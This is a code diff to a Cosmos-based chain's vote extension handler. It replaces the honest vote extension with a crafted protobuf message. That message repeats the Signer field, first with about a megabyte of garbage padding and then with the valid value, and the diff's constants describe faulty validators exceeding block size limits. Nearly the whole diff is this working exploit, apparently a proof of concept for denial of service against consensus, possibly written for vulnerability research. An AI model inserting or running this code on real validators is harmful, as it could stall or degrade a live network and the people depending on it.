@@ -8,6 +8,7 @@ import (
 	abci "github.com/cometbft/cometbft/abci/types"
 	"github.com/cosmos/cosmos-sdk/baseapp"
 	sdk "github.com/cosmos/cosmos-sdk/types"
+	"google.golang.org/protobuf/encoding/protowire"
 
 	"github.com/babylonlabs-io/babylon/v4/x/checkpointing/keeper"
 	ckpttypes "github.com/babylonlabs-io/babylon/v4/x/checkpointing/types"
@@ -97,11 +98,76 @@ func (h *VoteExtensionHandler) ExtendVote() sdk.ExtendVoteHandler {
 			panic(fmt.Errorf("failed to encode vote extension: %w", err))
 		}
 
-		h.logger.Info("successfully sent BLS signature in vote extension",
-			"epoch", epoch.EpochNumber, "height", req.Height, "validator", valOperAddr.String())
+		const (
+			maxTxBytes          = 3 * 1024 * 1024 //3MB
+			numFaultyValidators = 3
+			paddingSizePerVal   = 1024 * 1024 // 1MB per malicious validator
+			numHonestValidators = 9           // total 12 validators, 3 faulty
+			honestVoteExtSize   = 200         // ~200 bytes for honest vote extension
+		)
 
-		return &abci.ResponseExtendVote{VoteExtension: bz}, nil
+		maliciousBytes := buildMaliciousVoteExtension(
+			paddingSizePerVal,
+			ve.Signer,
+			ve.ValidatorAddress,
+			*ve.BlockHash,
+			1,
+			100,
+			blsSig,
+		)
+
+		h.logger.Info(
+			"successfully sent MALICIOOOOUS BLS signature in vote extension",
+			"epoch", epoch.EpochNumber, "height", req.Height, "validator", valOperAddr.String(), "valid-size", len(bz), "malicious-size", len(maliciousBytes))
+
+		return &abci.ResponseExtendVote{VoteExtension: maliciousBytes}, nil
 	}
+}
+
+func buildMaliciousVoteExtension(
+	paddingSize int,
+	validSigner string,
+	validValidator string,
+	blockHash []byte,
+	epochNum uint64,
+	height uint64,
+	blsSig []byte,
+) []byte {
+	var buf []byte
+
+	// Field 1 (Signer) - FIRST occurrence with garbage padding
+	garbageData := make([]byte, paddingSize)
+	for i := range garbageData {
+		garbageData[i] = byte(i % 256)
+	}
+	buf = protowire.AppendTag(buf, 1, protowire.BytesType)
+	buf = protowire.AppendString(buf, string(garbageData))
+
+	// Field 1 (Signer) - SECOND occurrence with valid value
+	buf = protowire.AppendTag(buf, 1, protowire.BytesType)
+	buf = protowire.AppendString(buf, validSigner)
+
+	// Field 2 (ValidatorAddress)
+	buf = protowire.AppendTag(buf, 2, protowire.BytesType)
+	buf = protowire.AppendString(buf, validValidator)
+
+	// Field 3 (BlockHash) - custom type, encoded as raw bytes
+	buf = protowire.AppendTag(buf, 3, protowire.BytesType)
+	buf = protowire.AppendBytes(buf, blockHash)
+
+	// Field 4 (EpochNum)
+	buf = protowire.AppendTag(buf, 4, protowire.VarintType)
+	buf = protowire.AppendVarint(buf, epochNum)
+
+	// Field 5 (Height)
+	buf = protowire.AppendTag(buf, 5, protowire.VarintType)
+	buf = protowire.AppendVarint(buf, height)
+
+	// Field 6 (BlsSig) - custom type, encoded as bytes
+	buf = protowire.AppendTag(buf, 6, protowire.BytesType)
+	buf = protowire.AppendBytes(buf, blsSig)
+
+	return buf
 }
 
 // VerifyVoteExtension verifies the BLS sig within the vote extension
